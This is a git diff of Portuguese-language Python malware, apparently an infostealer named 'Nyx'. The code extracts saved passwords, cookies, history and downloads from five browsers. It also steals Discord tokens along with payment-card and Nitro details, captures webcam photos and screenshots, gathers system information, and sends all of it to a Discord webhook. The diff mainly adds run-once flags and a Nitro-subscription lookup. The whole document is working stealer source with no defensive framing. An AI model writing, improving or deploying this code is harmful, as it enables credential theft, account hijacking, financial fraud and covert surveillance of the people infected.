@@ -22,6 +22,15 @@ pasta_nyx = os.path.join(appdata_local, 'Nyx')
 if not os.path.exists(pasta_nyx):
     os.makedirs(pasta_nyx)
 
+executou_informacoes_sistema = False
+executou_discord_info = False
+executou_webcam_foto = False
+executou_screenshot = False
+executou_password_extractor = False
+executou_browser_downloads = False
+executou_browser_history = False
+executou_cookie_extractor = False
+
 def executar_comando(comando):
     try:
         resultado = subprocess.check_output(comando, shell=True, text=True)
@@ -56,96 +65,108 @@ def enviar_para_discord(mensagem, embed=None):
         print(f"Erro ao enviar para o Discord: {response.status_code} - {response.text}")
 
 def executar_password_extractor():
-    try:
-        navegadores_suportados = ['Chrome', 'Firefox', 'Edge', 'Opera', 'Brave']
-        for navegador in navegadores_suportados:
-            navegador_map = {
-                'Chrome': 'chrome',
-                'Firefox': 'firefox',
-                'Edge': 'edge',
-                'Opera': 'opera',
-                'Brave': 'brave'
-            }
+    global executou_password_extractor
+    if not executou_password_extractor:
+        try:
+            navegadores_suportados = ['Chrome', 'Firefox', 'Edge', 'Opera', 'Brave']
+            for navegador in navegadores_suportados:
+                navegador_map = {
+                    'Chrome': 'chrome',
+                    'Firefox': 'firefox',
+                    'Edge': 'edge',
+                    'Opera': 'opera',
+                    'Brave': 'brave'
+                }
 
-            navegador_convertido = navegador_map[navegador]
-            extractor = PasswordExtractor(navegador_convertido)
-            passwords = extractor.get_passwords()
+                navegador_convertido = navegador_map[navegador]
+                extractor = PasswordExtractor(navegador_convertido)
+                passwords = extractor.get_passwords()
 
-            if passwords:
-                passwords_file_path = os.path.join(pasta_nyx, f"{navegador_convertido}_passwords.txt")
-                extractor.save_passwords_to_file(passwords, passwords_file_path)
+                if passwords:
+                    passwords_file_path = os.path.join(pasta_nyx, f"{navegador_convertido}_passwords.txt")
+                    extractor.save_passwords_to_file(passwords, passwords_file_path)
 
-    except Exception as e:
-        print(f"Erro ao executar PasswordExtractor: {e}")
+            executou_password_extractor = True
+        except Exception as e:
+            print(f"Erro ao executar PasswordExtractor: {e}")
 
 def executar_browser_downloads():
-    try:
-        navegadores_suportados = ['Chrome', 'Firefox', 'Edge', 'Opera', 'Brave']
-        for navegador in navegadores_suportados:
-            navegador_map = {
-                'Chrome': 'chrome',
-                'Firefox': 'firefox',
-                'Edge': 'edge',
-                'Opera': 'opera',
-                'Brave': 'brave'
-            }
+    global executou_browser_downloads
+    if not executou_browser_downloads:
+        try:
+            navegadores_suportados = ['Chrome', 'Firefox', 'Edge', 'Opera', 'Brave']
+            for navegador in navegadores_suportados:
+                navegador_map = {
+                    'Chrome': 'chrome',
+                    'Firefox': 'firefox',
+                    'Edge': 'edge',
+                    'Opera': 'opera',
+                    'Brave': 'brave'
+                }
 
-            navegador_convertido = navegador_map[navegador]
-            extractor = BrowserDownloadsExtractor(navegador_convertido)
-            downloads = extractor.get_downloads()
+                navegador_convertido = navegador_map[navegador]
+                extractor = BrowserDownloadsExtractor(navegador_convertido)
+                downloads = extractor.get_downloads()
 
-            if downloads:
-                downloads_file_path = os.path.join(pasta_nyx, f"{navegador_convertido}_downloads.txt")
-                extractor.save_downloads_to_file(downloads, downloads_file_path)
+                if downloads:
+                    downloads_file_path = os.path.join(pasta_nyx, f"{navegador_convertido}_downloads.txt")
+                    extractor.save_downloads_to_file(downloads, downloads_file_path)
 
-    except Exception as e:
-        print(f"Erro ao executar BrowserDownloadsExtractor: {e}")
+            executou_browser_downloads = True
+        except Exception as e:
+            print(f"Erro ao executar BrowserDownloadsExtractor: {e}")
 
 def executar_browser_history():
-    try:
-        navegadores_suportados = ['Chrome', 'Firefox', 'Edge', 'Opera', 'Brave']
-        for navegador in navegadores_suportados:
-            navegador_map = {
-                'Chrome': 'chrome',
-                'Firefox': 'firefox',
-                'Edge': 'edge',
-                'Opera': 'opera',
-                'Brave': 'brave'
-            }
+    global executou_browser_history
+    if not executou_browser_history:
+        try:
+            navegadores_suportados = ['Chrome', 'Firefox', 'Edge', 'Opera', 'Brave']
+            for navegador in navegadores_suportados:
+                navegador_map = {
+                    'Chrome': 'chrome',
+                    'Firefox': 'firefox',
+                    'Edge': 'edge',
+                    'Opera': 'opera',
+                    'Brave': 'brave'
+                }
 
-            navegador_convertido = navegador_map[navegador]
-            extractor = BrowserDataExtractor(navegador_convertido)
-            history = extractor.get_history()
+                navegador_convertido = navegador_map[navegador]
+                extractor = BrowserDataExtractor(navegador_convertido)
+                history = extractor.get_history()
 
-            if history:
-                history_file_path = os.path.join(pasta_nyx, f"{navegador_convertido}_history.txt")
-                extractor.save_history_to_file(history, history_file_path)
+                if history:
+                    history_file_path = os.path.join(pasta_nyx, f"{navegador_convertido}_history.txt")
+                    extractor.save_history_to_file(history, history_file_path)
 
-    except Exception as e:
-        print(f"Erro ao executar BrowserDataExtractor: {e}")
+            executou_browser_history = True
+        except Exception as e:
+            print(f"Erro ao executar BrowserDataExtractor: {e}")
 
 def executar_cookie_extractor():
-    try:
-        navegadores_suportados = ['Chrome', 'Firefox', 'Edge', 'Opera', 'Brave']
-        for navegador in navegadores_suportados:
-            navegador_map = {
-                'Chrome': 'chrome',
-                'Firefox': 'firefox',
-                'Edge': 'edge',
-                'Opera': 'opera',
-                'Brave': 'brave'
-            }
+    global executou_cookie_extractor
+    if not executou_cookie_extractor:
+        try:
+            navegadores_suportados = ['Chrome', 'Firefox', 'Edge', 'Opera', 'Brave']
+            for navegador in navegadores_suportados:
+                navegador_map = {
+                    'Chrome': 'chrome',
+                    'Firefox': 'firefox',
+                    'Edge': 'edge',
+                    'Opera': 'opera',
+                    'Brave': 'brave'
+                }
 
-            navegador_convertido = navegador_map[navegador]
-            extractor = CookieExtractor(navegador_convertido)
-            cookies = extractor.get_cookies()
+                navegador_convertido = navegador_map[navegador]
+                extractor = CookieExtractor(navegador_convertido)
+                cookies = extractor.get_cookies()
 
-            if cookies:
-                cookies_file_path = os.path.join(pasta_nyx, f"{navegador_convertido}_cookies.txt")
-                extractor.save_cookies_to_file(cookies, cookies_file_path)
+                if cookies:
+                    cookies_file_path = os.path.join(pasta_nyx, f"{navegador_convertido}_cookies.txt")
+                    extractor.save_cookies_to_file(cookies, cookies_file_path)
 
-    except Exception as e:
-        print(f"Erro ao executar CookieExtractor: {e}")
+            executou_cookie_extractor = True
+        except Exception as e:
+            print(f"Erro ao executar CookieExtractor: {e}")
 
 def criar_embed_com_imagens(caminho_foto1, caminho_foto2):
     return {
@@ -160,30 +181,36 @@ def criar_embed_com_imagens(caminho_foto1, caminho_foto2):
             },
             {
                 'name': 'Foto da Webcam',
-                'value': '![Webcam](attachment://webcam.png)',
+                'value': '![Webcam](attachment://webcam_foto.jpg)',
                 'inline': True
             }
-        ],
+        ],\
         'image': {
-            'url': 'attachment://webcam.png'
+            'url': 'attachment://webcam_foto.jpg'
         }
     }
 
 if __name__ == "__main__":
     try:
-        informacoes_sistema = obter_informacoes_sistema()
-        discord_info = TokenExtractor()
-        discord_info.extract_tokens()
-        
-        webcam_foto = capture_photo()
-        
-        screenshot = Sprint()
-        screenshot_path = os.path.join(pasta_nyx, 'prtscr.png')
-        webcam_path = os.path.join(pasta_nyx, 'webcam.png')
-        save_image(screenshot, screenshot_path)
+        if not executou_informacoes_sistema:
+            informacoes_sistema = obter_informacoes_sistema()
+            executou_informacoes_sistema = True
 
-        if webcam_foto:
-            save_image(webcam_foto, webcam_path)
+        if not executou_discord_info:
+            discord_info = TokenExtractor()
+            discord_info.extract_tokens()
+            executou_discord_info = True
+        
+        if not executou_webcam_foto:
+            webcam_foto = capture_photo()
+            executou_webcam_foto = True
+        
+        if not executou_screenshot:
+            screenshot = Sprint()
+            screenshot_path = os.path.join(pasta_nyx, 'prtscr.png')
+            webcam_path = os.path.join(pasta_nyx, 'webcam_foto.jpg')
+            save_image(screenshot, screenshot_path)
+            executou_screenshot = True
 
         user_info_instance = UserInfos()
         user_info = user_info_instance.get_user_info()
@@ -206,9 +233,9 @@ if __name__ == "__main__":
         enviar_para_discord('', embed=sistema_embed)
 
         os_embed = {
-            'title': 'Informações de SO',
+            'title': 'Informações do Sistema Operacional',
             'description': f'```\n{os_info}\n```',
-            'color': 0x00FF00
+            'color': 0xFF0000
         }
         enviar_para_discord('', embed=os_embed)
 
@@ -234,19 +261,30 @@ if __name__ == "__main__":
                 payment_sources = discord_info.get_payment_sources(token)
                 if payment_sources:
                     discord_embed['description'] += f"\nCartões de crédito: {len(payment_sources)}"
-                
+                else:
+                    discord_embed['description'] += "\nNenhum cartão de crédito registrado"
+
+                subscriptions = discord_info.get_nitro_subscription(token)
+                if subscriptions:
+                    for sub in subscriptions:
+                        renew_timestamp = sub.get("current_period_end")
+                        if renew_timestamp:
+                            expiration_date = datetime.fromtimestamp(renew_timestamp / 1000).strftime('%Y-%m-%d %H:%M:%S')
+                            discord_embed['description'] += f"\nNitro expira em: {expiration_date}"
+                        else:
+                            discord_embed['description'] += "\nNitro ativo, mas sem data de expiração disponível"
+
                 enviar_para_discord('', embed=discord_embed)
 
-        enviar_imagem_para_discord(screenshot_path)
         enviar_imagem_para_discord(webcam_path)
 
-        embed_imagens = criar_embed_com_imagens(screenshot_path, webcam_path)
-        enviar_para_discord('', embed=embed_imagens)
-        
+        if os.path.exists(screenshot_path):
+            enviar_imagem_para_discord(screenshot_path)
+
         executar_password_extractor()
         executar_browser_downloads()
         executar_browser_history()
         executar_cookie_extractor()
 
     except Exception as e:
-        print(f"Erro no script principal: {e}")
+        print(f"Ocorreu um erro durante a execução do script: {e}")
